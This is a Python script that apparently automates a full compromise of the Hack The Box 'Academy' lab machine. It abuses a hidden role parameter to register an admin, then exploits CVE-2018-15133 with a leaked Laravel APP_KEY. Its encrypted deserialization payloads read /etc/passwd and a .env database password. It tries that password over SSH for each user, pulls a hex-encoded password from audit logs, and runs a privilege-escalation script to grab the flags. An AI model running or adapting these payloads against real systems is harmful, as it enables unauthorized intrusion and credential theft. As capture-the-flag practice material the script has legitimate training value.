from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import sha256
import time
import hmac
import base64
import json
import hashlib
import subprocess
import string
import random
import sys
import requests
from bs4 import BeautifulSoup

Palette = {
    'red': '\033[31m',
    'green': '\033[32m',
    'yellow': '\033[33m',
    'blue': '\033[34m',
    'purple': '\033[35m',
    'cyan': '\033[36m',
    'grey': '\033[37m',
    'reset': '\033[0m'
}

def banner():
    print( Palette["green"] + """
 _   _ _____ ____    _                 _                      
| | | |_   _| __ )  / \   ___ __ _  __| | ___ _ __ ___  _   _ 
| |_| | | | |  _ \ / _ \ / __/ _` |/ _` |/ _ \ '_ ` _ \| | | |
|  _  | | | | |_) / ___ \ (_| (_| | (_| |  __/ | | | | | |_| |
|_| |_| |_| |____/_/   \_\___\__,_|\__,_|\___|_| |_| |_|\__, |
                                                        |___/ 
    _         _                            
   / \  _   _| |_ ___  _ ____      ___ __  
  / _ \| | | | __/ _ \| '_ \ \ /\ / / '_ \ 
 / ___ \ |_| | || (_) | |_) \ V  V /| | | |
/_/   \_\__,_|\__\___/| .__/ \_/\_/ |_| |_| by Void4m0n
                      |_|
""" + Palette["purple"] + "\n[!] Remember to add the following line to the /etc/hosts --> " + Palette["green"] + "10.10.10.215 academy.htb dev-staging-01.academy.htb\n" + Palette["reset"])

def waiting_animation(color):
    for i in range(3):
        print(Palette[f"{color}"] + ".", end='',flush=True)
        time.sleep(0.7)
    print(Palette['reset'] + "\n")
    return

def final_banner():
    print("\n" + Palette['purple'] + "[*] Exploit complete! Maybe a respect ;)?\n[*] HTB PROFILE --> https://app.hackthebox.com/profile/1104062\n" + Palette['reset'])  

def exit():
    print("\n" + Palette["red"] + "[X] Closing Script..." + Palette["reset"])
    sys.exit()

def try_conex(url): 
    print(Palette['yellow'] + "[*] Checking status of Academy" + Palette['reset'], end='') 
    waiting_animation("yellow")
    for i in range(10):
        try:
            r = requests.head(url, timeout=5)
            break
        except requests.exceptions.RequestException as e:
            i += 1 
            if i == 1:
                print(Palette['purple'] + f"[!] Academy seems to be down, the script will try 10 times to connect Academy\n[?] CHECK URL --> {url}\n")
            try_msg = Palette['purple'] + "--> "+ str(i) + " TRY\n"
            e = Palette['red'] + "[!] ACADEMY DOWN! " + try_msg + Palette['reset']
            print(e)
            time.sleep(15)
            if i == 10:   
                exit()
        
    print(Palette['green'] + "[+] ACADEMY UP!" + Palette['reset'])

def random_username():
    letters = string.ascii_lowercase
    username = ''.join(random.choice(letters) for i in range(8)) 
    password = ''.join(random.choice(letters) for i in range(8))
    return username, password

def register_admin_acc(url, username, password):
    # REGISTER ADMIN USER      
    register_url = url + "/register.php"
    data = { 
        "uid" : username,
        "password" : password,
        "confirm" : password,
        "roleid" : "1" # hidden parameter, defualt is 0, changing this parameter to 1 you get admin role
            } 

    print("\n" + Palette["yellow"] + "[*] Registering admin user in --> " + register_url + Palette["reset"], end="")
    waiting_animation("yellow")
    try:
        register_request = requests.post(register_url, data=data, timeout=5)
    except Exception as e: 
        print(Palette["red"] + "Error: " + str(e) + Palette["reset"])
        exit()    

    print(Palette["green"] + "[+] Admin user registered with credentials" + Palette["purple"] + f"\n\n    Username:{username}\n\n    Password:{password}\n" + Palette["reset"])

    # LOGIN IN ADMIN PANEL
    admin_url_login = url + "/admin.php"
    admin_data = {
        "uid" : username,
        "password" : password   
            } 
    s = requests.Session()
    print(Palette["yellow"] + "[*] Login in the admin panel --> " + admin_url_login +  Palette["reset"], end="")
    waiting_animation("yellow")
    try:
        admin_login_request = s.post(admin_url_login, data=admin_data, timeout=5) 
    except Exception as e: 
        print(Palette["red"] + "Error: " + str(e) + Palette["reset"])
        exit()    
 
    print(Palette["green"] + "[+] Login Successfully as " + Palette["purple"] + username, password  + Palette["reset"] + "\n")

    # EXTRACTING SUBDOMAIN FROM ADMIN PANEL
    admin_panel = url + "/admin-page.php"
    print(Palette["yellow"] + "[*] Extracting subdomain from the admin panel --> " + admin_panel +  Palette["reset"], end="")
    waiting_animation("yellow")
    try:

        soup = BeautifulSoup(admin_login_request.text, 'html.parser')
        test = soup.find_all('td')[10].text
        test_list = test.split()
        count = 0
        for i in test_list:
            count += 1
            if count == 4:
                subdomain = i
                break
    except Exception as e: 
        print(Palette["red"] + "Error: " + str(e) + Palette["reset"])
        exit()    

    print(Palette["green"] + "[+] Subdomain found in admin panel: " + subdomain + Palette["reset"])
    return subdomain


def explotating_CVE_2018_15133(url_laravel, subdomain):    

    print(Palette["yellow"] + "\n[*] Extracting Leaked APP_KEY in --> " + url_laravel +  Palette["reset"], end="")
    waiting_animation("yellow")
    try:
        laravel_leak = requests.get(url_laravel)
        soup = BeautifulSoup(laravel_leak.text, 'html.parser')
        find_app_key_tag = soup.find('span' , {'title':'51 characters'}).text
        APP_KEY = find_app_key_tag.split(":",1)[1]
    except Exception as e: 
        print(Palette["red"] + "Error: " + str(e) + Palette["reset"])
        exit()    

    print(Palette["green"] + "[+] APP_KEY: " + Palette["purple"] + APP_KEY + Palette["reset"]) 
    print(Palette["cyan"] + "\n[?] CVE-2018-15133 Docker poc --> https://github.com/kozmic/laravel-poc-CVE-2018-15133" + Palette["reset"])
    print(Palette["cyan"] + "\n[*] Extracting users through CVE-2018-15133" + Palette["reset"], end="")
    waiting_animation("cyan")
    print(Palette["yellow"] + "[*] Payload to extract users" + Palette["reset"], end="")
    waiting_animation("yellow")

    payload_raw = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\x00*\x00events";O:15:"Faker\\Generator":1:{s:13:"\x00*\x00formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"\x00*\x00event";s:50:"cat /etc/passwd | awk -F: \'$3 >= 1000 {print  $1}\'";}' 
    
    print(Palette["green"] + "[+] Payload: " + payload_raw + Palette["reset"])

    print(Palette["yellow"] + "\n[*] Generating malicious Header" + Palette["reset"], end="")
    waiting_animation("yellow")
    
    # Encrypting payload withh APP_KEY
    payload = encrypt_payload(APP_KEY, payload_raw) # encryption sequence extracted from https://github.com/aljavier/exploit_laravel_cve-2018-15133

    print(Palette["green"] + "[+] X-XSRF-TOKEN: " + payload + Palette["reset"])

    print(Palette["yellow"] + "\n[*] Sending malicious request to extract users" + Palette["reset"], end="")
    waiting_animation("yellow")
     
    try:
        header = {
            "X-XSRF-TOKEN" : payload
            }
        laravel_rce = requests.post(url_laravel, headers=header)
    except Exception as e: 
        print(Palette["red"] + "Error: " + str(e) + Palette["reset"])
        exit()    

    save = laravel_rce.text.split("<!DOCTYPE html><")[0]

    print(Palette["green"] + "[+] Users:\n\n" + Palette["purple"] + str(save) + Palette["reset"])

    lista = save.split("\n")

    # EXTRACTING PASSWORD
    print(Palette["cyan"] + "[*] Extracting password through CVE-2018-15133" + Palette["reset"], end="")
    waiting_animation("cyan")
    print(Palette["yellow"] + "[*] Payload to extract password" + Palette["reset"], end="")
    waiting_animation("yellow")

    payload_raw = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\x00*\x00events";O:15:"Faker\\Generator":1:{s:13:"\x00*\x00formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"\x00*\x00event";s:72:"cat /var/www/html/academy/.env | grep DB_PASSWORD | awk -F= \'{print $2}\'";}' 

    print(Palette["green"] + "[+] Payload: " + payload_raw + Palette["reset"])

    payload = encrypt_payload(APP_KEY, payload_raw) # encryption sequence extracted from https://github.com/aljavier/exploit_laravel_cve-2018-15133

    print(Palette["yellow"] + "\n[*] Generating malicious Header" + Palette["reset"], end="")
    waiting_animation("yellow")
    print(Palette["green"] + "[+] X-XSRF-TOKEN: " + payload + Palette["reset"])
    header = {
            "X-XSRF-TOKEN" : payload
            }
    try: 
        laravel_rce = requests.post(url_laravel, headers=header)
    except Exception as e: 
        print(Palette["red"] + "Error: " + str(e) + Palette["reset"])
        exit()   

    print(Palette["yellow"] + "\n[*] Sending malicius request to extract password" + Palette["reset"], end="")
    waiting_animation("yellow")
    ssh_pass = laravel_rce.text.split("<!DOCTYPE html><")[0].strip()
    print(Palette["green"] + "[+] Password: " + Palette["purple"] + ssh_pass + Palette["reset"] + "\n")

    ssh_connect(ssh_pass, lista)

def encrypt_payload(key_base64, payload_raw):
    key = base64.b64decode(key_base64) 
    payload = base64.b64encode(payload_raw.encode()).decode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC)
    value = cipher.encrypt(pad(base64.b64decode(payload), AES.block_size))
    payload = base64.b64encode(value)
    iv_base64 = base64.b64encode(cipher.iv)
    hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
    iv_base64 = iv_base64.decode("utf-8")
    payload = payload.decode("utf-8")
    data = {"iv": iv_base64, "value": payload, "mac": hashed_mac}
    json_data = json.dumps(data)
    payload_encoded = base64.b64encode(json_data.encode()).decode("utf-8")
    return payload_encoded

def ssh_connect(ssh_pass, lista):  

    print(Palette["yellow"] + "[*] \"Bruteforcing\" process started" + Palette["reset"], end="")
    waiting_animation("yellow")
    contador = 0
    for i in lista:
        contador += 1 
        user = i
        try: 
            print(Palette['yellow'] + f"[!] Try {contador} with credentials --> " +  Palette['green'] + f"{user}:{ssh_pass}\n" + Palette["reset"])
            connect = subprocess.run(f"sshpass -p '{ssh_pass}' ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-dss {user}@10.10.10.215" + " \"grep 'tty pid=2520' -r /var/log/audit/\"", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(Palette['green'] + "[+] Credentials found! --> " + Palette["purple"] + f"{user}:{ssh_pass}" + Palette['reset'])
            break      
        except subprocess.CalledProcessError as e:
             error = Palette['purple']  + e.stderr.decode().strip() + Palette['reset']
             print(Palette['red'] + f"[!] Error: " + error + "\n")
    
    print(Palette["yellow"] + f"\n[*] {user} is part of adm group, he can read interesting files in directories like /var/log" + Palette["reset"], end="")
    waiting_animation("yellow")
    datas = connect.stdout.decode().split("data=")
    hex_pass = datas[1].strip()
    print(Palette['green'] + "[+] Hex encoded credential found in /var/log/audit/audit.log.3! --> " + Palette["purple"] + f"{hex_pass}" + Palette['reset'])
    print(Palette["yellow"] + f"\n[*] Decoding Hex credential" + Palette["reset"], end="")
    waiting_animation("yellow")
    mrb3n_pass = bytes.fromhex(hex_pass).decode('utf-8')
    print(Palette['green'] + "[+] Hex cred decoded --> " + Palette["purple"] + f"{mrb3n_pass}" + Palette['reset'])

    # SUDO -L PRIVESC
    print(Palette["yellow"] + f"[*] Checking sudo -l perms" + Palette["reset"], end="")
    waiting_animation("yellow")
    try:
       sudo_l = subprocess.run(f"sshpass -p '{mrb3n_pass}' ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-dss mrb3n@10.10.10.215" + " \"echo 'mrb3n_Ac@d3my!' | sudo -S -l\"", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
    except subprocess.CalledProcessError as e:
        error = Palette['purple']  + e.stderr.decode().strip() + Palette['reset']
        print(Palette['red'] + f"[!] Error: " + error + "\n")
        exit()

    print(Palette["green"] + "[+] " + sudo_l.stdout.decode() + Palette["purple"] + "\n[?] More info --> https://gtfobins.github.io/gtfobins/composer/" + Palette["reset"]) 

    # Extracting flags
    try: 
        connect = subprocess.run(f"sshpass -p '{mrb3n_pass}' ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-dss mrb3n@10.10.10.215" + " 'bash -s' < utils/privesc.sh ", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)   
    except subprocess.CalledProcessError as e:
        error = Palette['purple']  + e.stderr.decode().strip() + Palette['reset']
        print(Palette['red'] + f"[!] Error: " + error + "\n")
        exit()
    
    flags = connect.stdout.decode().split("\n")
    #USER.TXT  
    print("\n" + Palette["yellow"] + f"[*] Extracting USER flag" + Palette["reset"], end="")
    waiting_animation("yellow")
    print(Palette["green"] + f"[+] USER flag: " + Palette["purple"] + flags[0] + Palette["reset"]) 
    #ROOT.TXT
    print("\n" + Palette["yellow"] + f"[*] Extracting ROOT flag" + Palette["reset"], end="")
    waiting_animation("yellow")
    print(Palette["green"] + f"[+] ROOT flag: " + Palette["purple"] + flags[1] + Palette["reset"]) 
   




if __name__ == '__main__':
    banner()
    url = "http://academy.htb"
    try_conex(url)
    random_creds = random_username()
    username = random_creds[0]
    password = random_creds[1]
    subdomain = register_admin_acc(url, username, password)
    url_laravel = "http://" + subdomain
    explotating_CVE_2018_15133(url_laravel, subdomain)
    final_banner()
    
